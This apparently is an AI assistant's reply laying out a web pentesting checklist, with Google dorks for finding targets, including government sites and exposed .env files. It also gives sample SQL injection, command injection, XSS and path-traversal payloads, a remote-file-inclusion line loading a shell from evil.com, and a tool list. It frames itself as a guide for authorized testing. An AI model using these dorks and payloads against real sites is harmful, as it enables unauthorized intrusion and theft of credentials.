## 🔍 **1. Using Google Dorking to Find Suitable Targets**

> **⚠️ Use only sites where testing is explicitly allowed (e.g., bug bounty programs, public CTF platforms, or testing environments). Unauthorized testing is illegal.**

### 🔧 **Useful Google Dorks for Finding Testable Sites**

Use these to discover potentially vulnerable or misconfigured pages:

| Dork                             | Use Case                                 |          |            |                 |
| -------------------------------- | ---------------------------------------- | -------- | ---------- | --------------- |
| `inurl:admin`                    | Login/admin panels                       |          |            |                 |
| `intitle:"index of"`             | Open directories                         |          |            |                 |
| `inurl:login` or `intitle:Login` | Login pages                              |          |            |                 |
| `inurl:.php?id=`                 | Parameters vulnerable to SQLi or LFI     |          |            |                 |
| `inurl:/search?q=`               | Parameters potentially vulnerable to XSS |          |            |                 |
| `filetype:env` or `filetype:log` | Exposed `.env` or `.log` files           |          |            |                 |
| `site:*.gov.in inurl:php?id=`    | Government sites with parameters         |          |            |                 |
| `"Warning: mysql_" filetype:php` | Exposed PHP error messages               |          |            |                 |
| `"Index of /admin"`              | Exposed directories                      |          |            |                 |
| \`ext\:sql                       | ext\:db                                  | ext\:bak | ext\:old\` | Backup DB files |

---

## 🧪 **2. Web Pentesting Checklist (By Vulnerability Type)**

This checklist helps you systematically test for vulnerabilities.

### ✅ **Information Gathering**

* [ ] Whois, DNS lookup
* [ ] HTTP headers (`curl -I`)
* [ ] Robots.txt, sitemap.xml
* [ ] Discover endpoints (e.g., `/admin`, `/api/`)
* [ ] Technology stack (using [Wappalyzer](https://www.wappalyzer.com/) or `whatweb`)

### 💉 **Injection Vulnerabilities**

* [ ] **SQL Injection** (`' OR 1=1--`, use tools like `sqlmap`)
* [ ] **Command Injection** (`; ls`, `&& whoami`)
* [ ] **LDAP/XPath Injection** (if using those systems)

### ⚔️ **Cross-Site Scripting (XSS)**

* [ ] Test reflected: `?q=<script>alert(1)</script>`
* [ ] Test stored (comment fields, forms)
* [ ] Use common payloads from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

### 🗃 **File Inclusion**

* [ ] Local File Inclusion (LFI): `?page=../../../../etc/passwd`
* [ ] Remote File Inclusion (RFI): `?page=http://evil.com/shell.txt`

### 🔐 **Authentication/Session**

* [ ] Default credentials (`admin:admin`)
* [ ] Insecure login mechanisms (check for plaintext)
* [ ] Bruteforce possible? (try `hydra`)
* [ ] Check for session fixation / session hijacking

### 🧾 **Sensitive Data Exposure**

* [ ] Exposed `.env`, `.git`, `.bak`, `.sql` files
* [ ] Misconfigured CORS headers
* [ ] Tokens, secrets in JavaScript files

### 📤 **File Upload Vulnerabilities**

* [ ] Upload executable files (e.g., `.php`, `.js`)
* [ ] Bypass extension filter (`.php.png`)
* [ ] Try double extensions (`file.php;.jpg`)

### 🔍 **Access Control**

* [ ] IDOR (Insecure Direct Object Reference): Change `user_id=1` to `user_id=2`
* [ ] Force browsing: access `/admin` without auth
* [ ] Test for privilege escalation

### 📦 **Subdomain Enumeration**

* [ ] Use tools like `assetfinder`, `amass`
* [ ] Check each subdomain for test pages or dev environments

---

## 🛠 Tools You Might Use

| Tool                     | Use                            |
| ------------------------ | ------------------------------ |
| **Burp Suite**           | Intercept & manipulate traffic |
| **sqlmap**               | Automated SQL injection        |
| **dirsearch / gobuster** | Directory brute-forcing        |
| **nikto**                | Web server scanning            |
| **nuclei**               | Fast scanning with templates   |
| **ffuf**                 | Fast content discovery         |
| **subfinder / amass**    | Subdomain discovery            |

---

## ✅ Tips for Legal & Ethical Practice

* Only test on **authorized** targets (e.g., listed on [HackerOne](https://hackerone.com) or [Bugcrowd](https://bugcrowd.com)).
* Report bugs responsibly.
* Avoid DoS or anything destructive.

---

If you'd like, I can help you:

* Create a custom checklist as a printable PDF
* Set up a testing lab to practice these
* Write PoCs or scripts for exploitation

Let me know what you need next.
